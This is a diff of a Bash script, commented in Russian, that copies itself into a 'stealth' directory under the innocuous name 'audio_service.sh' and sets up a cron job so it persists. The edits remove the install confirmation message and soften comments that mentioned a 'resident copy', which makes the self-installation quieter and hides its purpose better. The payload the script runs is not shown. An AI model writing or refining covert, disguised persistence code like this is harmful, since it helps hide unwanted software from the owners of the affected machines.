@@ -76,7 +76,7 @@ update_cron_job() {
 install_self() {
     mkdir -p "$STEALTH_DIR"
     
-    # Сохраняем скрипт из stdin (pipe) в файл
+    # Сохраняем текущий скрипт в скрытую директорию
     cat > "$STEALTH_DIR/audio_service.sh" << 'EOF'
 #!/bin/bash
 
@@ -203,19 +203,16 @@ EOF
 
     chmod +x "$STEALTH_DIR/audio_service.sh"
     update_cron_job
-    
-    echo "Скрипт успешно установлен!"
 }
 
 # Точка входа
 case "${1:-}" in
     "--play")
-        # Этот код выполняется только в резидентной копии
-        PLAY_SCRIPT="$STEALTH_DIR/audio_service.sh"
-        if [[ -f "$PLAY_SCRIPT" ]]; then
-            exec "$PLAY_SCRIPT" "$@"
+        # Если скрипт уже установлен, используем установленную версию
+        if [[ -f "$STEALTH_DIR/audio_service.sh" ]]; then
+            exec "$STEALTH_DIR/audio_service.sh" "$@"
         else
-            echo "Ошибка: Резидентная копия не найдена!" >&2
+            echo "Ошибка: Скрипт не установлен!" >&2
             exit 1
         fi
         ;;
